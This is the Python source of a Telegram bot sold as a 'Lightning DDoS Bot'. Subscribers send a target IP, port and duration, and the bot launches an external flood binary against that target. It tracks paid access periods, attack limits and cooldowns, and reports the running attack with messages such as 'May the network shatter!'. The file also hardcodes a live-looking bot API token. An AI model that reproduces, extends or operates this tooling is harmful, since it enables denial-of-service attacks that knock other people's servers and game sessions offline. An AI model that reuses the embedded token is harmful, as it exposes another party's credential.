import telebot
from telebot import types
import datetime
import os
import time
import logging
import re
from collections import defaultdict
import subprocess
from threading import Timer, Lock
import json
import atexit
import asyncio
import threading
import math

# Set up logging
logging.basicConfig(level=logging.INFO)

# Constants
MAX_ATTACK_DURATION = 240
USER_ACCESS_FILE = "user_access.txt"
ATTACK_LOG_FILE = "attack_log.txt"
OWNER_ID = "6191432888"
bot = telebot.TeleBot('8018452264:AAGcSbeMR-pHU36FMMA5HGd340bFpTEQy9w')

# Global feedback counters and timestamp dictionaries
feedback_count = {}
feedback_sent_time = {}  # When feedback message was sent (in seconds since epoch)
feedback_received = {}   # Tracks if feedback for a given user has already been received

# Auto-convert backup file on first run
if not os.path.exists(USER_ACCESS_FILE) and os.path.exists("user_access_backup.txt"):
    logging.info("Converting backup file to user_access.txt")
    try:
        with open("user_access_backup.txt", "r") as backup, open(USER_ACCESS_FILE, "w") as main:
            for line in backup:
                parts = line.strip().split(",")
                if len(parts) >= 3:
                    main.write(f"{parts[0]},{parts[-1]}\n")
    except Exception as e:
        logging.error(f"Backup conversion failed: {e}")

def load_user_access():
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            access = {}
            for line in file:
                parts = line.strip().split(",")
                if len(parts) >= 3:  # Backup format
                    user_id, expiration = parts[0], parts[-1]
                elif len(parts) == 2:  # Normal format
                    user_id, expiration = parts
                else:
                    continue
                try:
                    access[user_id] = datetime.datetime.fromisoformat(expiration)
                except ValueError:
                    logging.error(f"Invalid expiration format for user {user_id}")
            return access
    except Exception as e:
        logging.error(f"Error loading user access: {e}")
        return {}

# ----------------------
# Data Persistence Setup
# ----------------------
attack_limits = {}
user_cooldowns = {}
active_attacks = []  # List of dictionaries with attack info
user_command_count = defaultdict(int)
last_command_time = {}
attacks_lock = Lock()

def save_persistent_data():
    data = {'attack_limits': attack_limits, 'user_cooldowns': user_cooldowns}
    with open('persistent_data.json', 'w') as f:
        json.dump(data, f)

def load_persistent_data():
    try:
        with open('persistent_data.json', 'r') as f:
            data = json.load(f)
            attack_limits.update(data.get('attack_limits', {}))
            user_cooldowns.update(data.get('user_cooldowns', {}))
    except FileNotFoundError:
        pass

atexit.register(save_persistent_data)

# ----------------------
# Define send_final_message
# ----------------------
def send_final_message(attack):
    with attacks_lock:
        if attack in active_attacks:
            active_attacks.remove(attack)
    save_active_attacks()

# ----------------------
# Attack Persistence
# ----------------------
def load_active_attacks():
    global active_attacks
    try:
        with open('active_attacks.json', 'r') as f:
            attacks = json.load(f)
            for attack in attacks:
                attack['end_time'] = datetime.datetime.fromisoformat(attack['end_time'])
                remaining = (attack['end_time'] - datetime.datetime.now()).total_seconds()
                if remaining > 0:
                    with attacks_lock:
                        active_attacks.append(attack)
                    Timer(remaining, send_final_message, [attack]).start()
    except FileNotFoundError:
        pass

def save_active_attacks():
    with attacks_lock:
        attacks_to_save = [{
            'user_id': a['user_id'],
            'target': a['target'],
            'port': a['port'],
            'end_time': a['end_time'].isoformat(),
            'message_id': a.get('message_id')
        } for a in active_attacks]
    with open('active_attacks.json', 'w') as f:
        json.dump(attacks_to_save, f)

# ----------------------
# Asynchronous Event Loop Setup
# ----------------------
async_loop = asyncio.new_event_loop()
def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=start_async_loop, args=(async_loop,), daemon=True).start()

# ----------------------
# Helper Functions
# ----------------------
def save_user_access():
    temp_file = f"{USER_ACCESS_FILE}.tmp"
    try:
        with open(temp_file, "w") as file:
            for user_id, expiration in user_access.items():
                file.write(f"{user_id},{expiration.isoformat()}\n")
        os.replace(temp_file, USER_ACCESS_FILE)
    except Exception as e:
        logging.error(f"Error saving user access: {e}")

def log_attack(user_id, target, port, duration):
    try:
        with open(ATTACK_LOG_FILE, "a") as log_file:
            log_file.write(f"{datetime.datetime.now()}: User {user_id} attacked {target}:{port} for {duration} seconds.\n")
    except Exception as e:
        logging.error(f"Error logging attack: {e}")

def is_valid_ip(ip):
    return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip) is not None

def is_rate_limited(user_id):
    now = datetime.datetime.now()
    cooldown = user_cooldowns.get(user_id, 300)
    if user_id in last_command_time and (now - last_command_time[user_id]).seconds < cooldown:
        user_command_count[user_id] += 1
        return user_command_count[user_id] > 3
    else:
        user_command_count[user_id] = 1
        last_command_time[user_id] = now
    return False

# New helper function to check access:
def is_authorized(message):
    # Owner is always authorized.
    if str(message.from_user.id) == OWNER_ID:
        return True
    now = datetime.datetime.now()
    chat_id = str(message.chat.id)
    user_id = str(message.from_user.id)
    # If in a group chat, check if the chat id (or fallback to user id) is granted access.
    if message.chat.type in ["group", "supergroup"]:
        if chat_id in user_access and user_access[chat_id] >= now:
            return True
        if user_id in user_access and user_access[user_id] >= now:
            return True
        return False
    else:
        # In a private chat, check user access only.
        if user_id in user_access and user_access[user_id] >= now:
            return True
        return False

user_access = load_user_access()
load_persistent_data()
load_active_attacks()

# ---------------------------
# Asynchronous Countdown Function
# ---------------------------
async def async_update_countdown(message, msg_id, start_time, duration, caller_id, target, port, attack_info):
    end_time = start_time + datetime.timedelta(seconds=duration)
    loop = asyncio.get_running_loop()
    while True:
        remaining = (end_time - datetime.datetime.now()).total_seconds()
        if remaining <= 0:
            break
        try:
            await loop.run_in_executor(None, lambda: bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg_id,
                text=f"""
⚡️🔥 ATTACK DEPLOYED 🔥⚡️

👑 Commander: `{caller_id}`
🎯 Target Locked: `{target}`
📡 Port Engaged: `{port}`
⏳ Time Remaining: `{int(remaining)} seconds`
⚔️ Weapon: `BGMI Protocol`
🔥 The attack is in progress... 🔥
                """,
                parse_mode='Markdown'
            ))
        except Exception as e:
            logging.error(f"Async countdown update error: {e}")
        await asyncio.sleep(1)
    try:
        await loop.run_in_executor(None, lambda: bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg_id,
            text=f"""
✅ ATTACK COMPLETED ✅
🎯 Target: `{target}`
📡 Port: `{port}`
⏳ Duration: `{duration} seconds`
🔥 Attack finished successfully! 🔥
                """,
            parse_mode='Markdown'
        ))
    except Exception as e:
        logging.error(f"Async final message error: {e}")
    with attacks_lock:
        if attack_info in active_attacks:
            active_attacks.remove(attack_info)
    save_active_attacks()

# ---------------------------
# Feedback Functions
# ---------------------------
def ask_attack_feedback(user_id, chat_id):
    markup = types.InlineKeyboardMarkup()
    hit_button = types.InlineKeyboardButton("✅ Hit", callback_data=f"feedback_hit_{user_id}")
    not_hit_button = types.InlineKeyboardButton("❌ Not Hit", callback_data=f"feedback_not_{user_id}")
    stop_button = types.InlineKeyboardButton("⏹ Stop Attack", callback_data=f"feedback_stop_{user_id}")
    # Arrange hit and not hit in one row, and stop attack on a new row.
    markup.row(hit_button, not_hit_button)
    markup.add(stop_button)
    msg = bot.send_message(
        chat_id,
        f"<a href='tg://user?id={user_id}'>User</a>, did your attack hit?",
        parse_mode="HTML",
        reply_markup=markup
    )
    feedback_sent_time[user_id] = time.time()

@bot.callback_query_handler(func=lambda call: call.data.startswith("feedback_"))
def handle_feedback(call):
    data = call.data.split("_")
    # Handle the "Stop Attack" callback
    if call.data.startswith("feedback_stop_"):
        expected_user_id = data[2]
        if str(call.from_user.id) != expected_user_id and str(call.from_user.id) != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ You are not authorized to stop this attack.")
            return
        attack_to_stop = None
        for attack in active_attacks:
            if attack['user_id'] == expected_user_id:
                attack_to_stop = attack
                break
        if not attack_to_stop:
            bot.answer_callback_query(call.id, "No running attack found.")
            return
        proc = attack_to_stop.get("proc")
        if proc:
            try:
                proc.terminate()
            except Exception as e:
                logging.error(f"Error stopping process: {e}")
        with attacks_lock:
            if attack_to_stop in active_attacks:
                active_attacks.remove(attack_to_stop)
        save_active_attacks()
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="Attack stopped."
            )
        except Exception as e:
            logging.error("Error editing message after stopping attack: " + str(e))
        bot.answer_callback_query(call.id, "Attack stopped.")
        return

    # Process Hit or Not Hit feedback
    feedback = data[1]  # "hit" or "not"
    expected_user_id = data[2]
    if feedback_received.get(expected_user_id, False):
        bot.answer_callback_query(call.id, "Feedback already received.")
        return
    if str(call.from_user.id) != expected_user_id and str(call.from_user.id) != OWNER_ID:
        bot.answer_callback_query(call.id, "❌ You are not authorized to provide feedback for this attack.")
        return
    current_time = time.time()
    sent_time = feedback_sent_time.get(expected_user_id)
    if sent_time and (current_time - sent_time > 60):
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Feedback time expired. Please provide timely feedback next time."
        )
        bot.answer_callback_query(call.id, "Feedback time expired.")
        return
    global feedback_count
    if feedback == "not":
        feedback_count[expected_user_id] = feedback_count.get(expected_user_id, 0) + 1
        result_text = f"Negative feedback recorded ({feedback_count[expected_user_id]}/7)."
    else:
        feedback_count[expected_user_id] = 0
        result_text = "Great! Feedback noted."
    feedback_received[expected_user_id] = True
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"Feedback received: {'Hit' if feedback == 'hit' else 'Not Hit'}"
        )
    except Exception as e:
        logging.error("Error editing feedback message: " + str(e))
    bot.answer_callback_query(call.id, result_text)

# ---------------------------
# Bot Commands
# ---------------------------
@bot.message_handler(commands=['stop_all'])
def stop_all_command(message):
    caller_id = str(message.from_user.id)
    if caller_id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can stop all attacks.")
        return
    stopped = 0
    with attacks_lock:
        for attack in active_attacks:
            proc = attack.get("proc")
            if proc:
                try:
                    proc.terminate()
                    stopped += 1
                except Exception as e:
                    logging.error(f"Error stopping process: {e}")
        active_attacks.clear()
    save_active_attacks()
    bot.reply_to(message, f"✅ Stopped {stopped} running attack(s).")

@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_message = """
🌟 Welcome to the Lightning DDoS Bot!

⚡️ With this bot, you can:
- Check your subscription status.
- Simulate powerful attacks responsibly.
- Manage access and commands efficiently.

🚀 Use /help to see the available commands and get started!

🛡️ For assistance, contact tg = @wtf_vai 
         owner = @wtf_vai

Note: Unauthorized access is prohibited. Contact an admin if you need access.
    """
    bot.reply_to(message, welcome_message, parse_mode='HTML')

@bot.message_handler(commands=['bgmi', 'attack'])
def handle_bgmi(message):
    if not is_authorized(message):
        bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
        return
    caller_id = str(message.from_user.id)
    command = message.text.split()
    if len(command) != 4 or not command[3].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/bgmi <target> <port> <duration>`", parse_mode='Markdown')
        return
    target, port, duration = command[1], command[2], int(command[3])
    if not is_valid_ip(target):
        bot.reply_to(message, "❌ Invalid target IP! Please provide a valid IP address.")
        return
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
        return
    int_port = int(port)
    BLOCKED_PORTS = {17000, 17500, 20000, 20001, 20002}
    if int_port <= 10000 or int_port >= 30000 or int_port in BLOCKED_PORTS:
         bot.reply_to(message, f"🚫 The port `{int_port}` is blocked! Please use a different port.")
         return
    if duration > MAX_ATTACK_DURATION:
        bot.reply_to(message, f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
        return
    if caller_id in attack_limits and duration > attack_limits[caller_id]:
        bot.reply_to(message, f"⚠️ Your maximum allowed attack duration is {attack_limits[caller_id]} seconds.")
        return
    current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
    if len(current_active) >= 1:
        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
        return
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    attack_info = {'user_id': caller_id, 'target': target, 'port': port, 'end_time': attack_end_time}
    try:
        proc = subprocess.Popen(["./tester", target, str(port), str(duration), "900"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        attack_info["proc"] = proc
    except Exception as e:
        logging.error(f"Subprocess error: {e}")
        bot.reply_to(message, "🚨 An error occurred while executing the attack command.")
        return
    with attacks_lock:
        active_attacks.append(attack_info)
    save_active_attacks()
    log_attack(caller_id, target, port, duration)
    msg = bot.send_message(
        message.chat.id,
        f"""
⚡️🔥 ATTACK DEPLOYED 🔥⚡️

👑 Commander: `{caller_id}`
🎯 Target Locked: `{target}`
📡 Port Engaged: `{port}`
⏳ Time Remaining: `{duration} seconds`
⚔️ Weapon: `BGMI Protocol`
🔥 The wrath is unleashed. May the network shatter! 🔥
        """,
        parse_mode='Markdown'
    )
    attack_info['message_id'] = msg.message_id
    save_active_attacks()
    asyncio.run_coroutine_threadsafe(
        async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, caller_id, target, port, attack_info),
        async_loop
    )
    ask_attack_feedback(caller_id, message.chat.id)

@bot.message_handler(commands=['when'])
def when_command(message):
    global active_attacks
    active_attacks = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
    if not active_attacks:
        reply = bot.reply_to(message, "No attacks are currently in progress.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    active_attack_message = "Current active attacks:\n"
    for attack in active_attacks:
        target = attack['target']
        port = attack['port']
        time_remaining = max((attack['end_time'] - datetime.datetime.now()).total_seconds(), 0)
        active_attack_message += f"🌐 Target: `{target}`, 📡 Port: `{port}`, ⏳ Remaining Time: {int(time_remaining)} seconds\n"
    reply = bot.reply_to(message, active_attack_message)
    Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
🚀 Available Commands:
- /start - Get started with a welcome message!
- /help - Discover all the available commands.
- /bgmi <target> <port> <duration> - Launch an attack.
- /stop_all - Stop all running attacks. (Owner only)
- /when - Check the remaining time for current attacks.
- /grant <user_id> <duration> - Grant access. For groups, use the group chat ID (negative number).
- /revoke <user_id> - Revoke access.
- /attack_limit <user_id> <max_duration> - Set max attack duration (Owner only).
- /status - Check your subscription status.
- /list_users - List all users with access (Owner only).
- /backup - Backup user access data (Owner only).
- /download_backup - Download user data (Owner only).
- /set_cooldown <user_id> <minutes> - Set a user's cooldown time (minimum 1 minute, Owner only).

Usage Notes:
- Replace <user_id>, <target>, <port>, <duration> with appropriate values.
- For groups, use the group chat ID (e.g., -1002298778493) with /grant.
- For assistance, contact the owner.
    """
    try:
        bot.reply_to(message, help_text, parse_mode='HTML')
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Telegram API error: {e}")
        bot.reply_to(message, "🚨 An error occurred while processing your request. Please try again later.")

@bot.message_handler(commands=['grant'])
def grant_command(message):
    caller = str(message.from_user.id)
    if caller != OWNER_ID:
        reply = bot.reply_to(message, "❌ You are not authorized to use this command.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    command = message.text.split()
    if len(command) != 3:
        reply = bot.reply_to(message, "Invalid format! Use: `/grant <user_id> <duration>` (e.g., /grant -1002298778493 1)")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    target_user = command[1]
    duration_str = command[2].lower()
    try:
        if duration_str.endswith("h"):
            hours = int(duration_str[:-1])
            delta = datetime.timedelta(hours=hours)
        elif duration_str.endswith("d"):
            days = int(duration_str[:-1])
            delta = datetime.timedelta(days=days)
        elif duration_str.isdigit():
            days = int(duration_str)
            delta = datetime.timedelta(days=days)
        else:
            reply = bot.reply_to(message, "Invalid duration format! Use a number followed by 'd' for days or 'h' for hours.")
            Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
            return
    except ValueError:
        reply = bot.reply_to(message, "Invalid duration value!")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    expiration_date = datetime.datetime.now() + delta
    user_access[target_user] = expiration_date
    save_user_access()
    reply = bot.reply_to(message, f"✅ Access granted until {expiration_date.strftime('%Y-%m-%d %H:%M:%S')} for ID: {target_user}.")
    Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()

@bot.message_handler(commands=['revoke'])
def revoke_command(message):
    caller = str(message.from_user.id)
    if caller != OWNER_ID:
        reply = bot.reply_to(message, "❌ You are not authorized to use this command.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    command = message.text.split()
    if len(command) != 2:
        reply = bot.reply_to(message, "Invalid format! Use: `/revoke <user_id>`")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    target_user = command[1]
    if target_user in user_access:
        del user_access[target_user]
        save_user_access()
        reply = bot.reply_to(message, f"✅ Access revoked for {target_user}.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
    else:
        reply = bot.reply_to(message, f"❌ ID {target_user} does not have access.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()

@bot.message_handler(commands=['attack_limit'])
def attack_limit_command(message):
    caller = str(message.from_user.id)
    if caller != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/attack_limit <user_id> <max_duration>`")
        return
    target_user, max_duration = command[1], int(command[2])
    attack_limits[target_user] = max_duration
    save_persistent_data()
    bot.reply_to(message, f"✅ Attack limit set to {max_duration} seconds for {target_user}.")

@bot.message_handler(commands=['list_users'])
def list_users_command(message):
    caller = str(message.from_user.id)
    if caller != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    now = datetime.datetime.now()
    lines = []
    for uid, exp in user_access.items():
        delta = exp - now
        total_seconds = delta.total_seconds()
        if total_seconds < 0:
            continue
        days = delta.days
        hours, remainder = divmod(delta.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        try:
            chat_info = bot.get_chat(uid)
            name = chat_info.first_name if chat_info.first_name else uid
        except Exception:
            name = uid
        if days > 0:
            line = f"{name} (ID: {uid}) - {days} day(s) {hours} hour(s) {minutes} minute(s) left"
        else:
            line = f"{name} (ID: {uid}) - {hours} hour(s) {minutes} minute(s) left"
        lines.append(line)
    reply_text = "Users:\n" + "\n".join(lines)
    bot.reply_to(message, reply_text)

@bot.message_handler(commands=['backup'])
def backup_command(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    with open("user_access_backup.txt", "w") as backup_file:
        for uid, exp in user_access.items():
            try:
                chat_info = bot.get_chat(uid)
                name = chat_info.first_name if chat_info.first_name else uid
            except Exception as e:
                logging.error(f"Error retrieving info for {uid}: {e}")
                name = uid
            backup_file.write(f"{uid},{name},{exp.isoformat()}\n")
    bot.reply_to(message, "✅ User access data has been backed up.")

@bot.message_handler(commands=['download_backup'])
def download_backup(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    with open("user_access_backup.txt", "rb") as backup_file:
        bot.send_document(message.chat.id, backup_file)

@bot.message_handler(commands=['set_cooldown'])
def set_cooldown_command(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/set_cooldown <user_id> <minutes>`", parse_mode='Markdown')
        return
    target_user_id = command[1]
    new_cooldown_minutes = int(command[2])
    if new_cooldown_minutes < 1:
        new_cooldown_minutes = 1
    new_cooldown_seconds = new_cooldown_minutes * 60
    user_cooldowns[target_user_id] = new_cooldown_seconds
    save_persistent_data()
    bot.reply_to(message, f"✅ Cooldown for {target_user_id} set to {new_cooldown_minutes} minute(s).")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.from_user.id)
    if user_id in user_access:
        expiration = user_access[user_id]
        bot.reply_to(message, f"✅ Your access is valid until {expiration.strftime('%Y-%m-%d %H:%M:%S')}.")
    else:
        bot.reply_to(message, "❌ You do not have access. Contact the owner.")

@bot.message_handler(commands=['stop_all'])
def stop_all_command(message):
    caller_id = str(message.from_user.id)
    if caller_id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can stop all attacks.")
        return
    stopped = 0
    with attacks_lock:
        for attack in active_attacks:
            proc = attack.get("proc")
            if proc:
                try:
                    proc.terminate()
                    stopped += 1
                except Exception as e:
                    logging.error(f"Error stopping process: {e}")
        active_attacks.clear()
    save_active_attacks()
    bot.reply_to(message, f"✅ Stopped {stopped} running attack(s).")

# Polling with retry logic
while True:
    try:
        bot.polling(none_stop=True, interval=0, allowed_updates=["message", "callback_query"])
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(5)
